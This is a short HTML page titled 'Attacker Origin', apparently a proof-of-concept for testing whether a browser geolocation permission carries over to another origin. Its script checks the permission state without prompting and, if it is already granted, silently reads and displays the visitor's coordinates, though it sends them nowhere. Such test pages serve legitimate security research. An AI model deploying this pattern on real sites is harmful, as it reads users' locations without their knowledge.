<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Attacker Origin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="font-family:system-ui; text-align:center; margin-top:80px">

<h2>Attacker Origin</h2>
<p id="origin"></p>
<p id="status">Waitingâ€¦</p>

<script>
const status = document.getElementById('status');

document.getElementById('origin').textContent =
  'Current origin: ' + location.origin;

// Cek permission TANPA memicu dialog
if (navigator.permissions) {
  navigator.permissions.query({ name: 'geolocation' })
    .then(p => {
      status.textContent =
        'Permission state on load: ' + p.state;

      // HANYA baca lokasi jika sudah granted
      if (p.state === 'granted') {
        navigator.geolocation.getCurrentPosition(
          pos => {
            status.textContent +=
              '\nLocation received:\n' +
              pos.coords.latitude + ', ' +
              pos.coords.longitude;
          },
          err => {
            status.textContent =
              'Read error: ' + err.message;
          }
        );
      }
    });
} else {
  status.textContent = 'Permissions API not available';
}
</script>

</body>
</html>
